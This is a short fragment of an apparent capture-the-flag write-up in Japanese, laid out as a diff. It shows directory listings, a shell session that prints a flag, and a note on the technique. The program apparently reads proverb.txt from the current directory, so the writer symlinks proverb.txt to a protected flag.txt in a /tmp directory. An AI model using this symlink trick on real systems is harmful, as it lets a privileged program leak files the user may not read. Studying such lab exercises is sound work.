@@ -1,0 +1,11 @@
+lrwxrwxrwx 1 q13 q13  8  3月  9 18:56 2017 flag -> flag.txt
+lrwxrwxrwx 1 q13 q13 17  3月  9 19:00 2017 pro -> /home/q13/proverb
+lrwxrwxrwx 1 q13 q13 18  3月  8 14:27 2017 proverb.txt -> /home/q13/flag.txt
+[q13@localhost hoge]$ pro
+-bash: pro: コマンドが見つかりません
+[q13@localhost hoge]$ 
+[q13@localhost hoge]$ ./pro 
+FLAG_XoK9PzskYedj/T&B
+
+
+/tmp以下にディレクトリを作って，まずはproverbのシンボリックリンクを作る．このプログラムは恐らく，カレントディレクトリにあるproverb.txtを読みだしているので，同じようにproverb.txtの名前で，flagへのシンボリックリンクを張ってあげる．
